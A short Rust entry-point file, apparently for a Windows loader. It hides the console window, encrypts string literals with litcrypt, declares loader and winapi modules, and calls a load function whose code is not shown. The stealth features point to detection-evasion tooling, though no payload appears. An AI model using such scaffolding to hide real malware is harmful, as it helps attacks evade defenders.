#![cfg_attr(
    all(
      target_os = "windows",
      feature = "no_console",
    ),
    windows_subsystem = "windows"
  )]  

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

mod loader;
mod helpers;
mod winapi;
mod error;
mod debug;

fn main() {
    loader::do_load();
}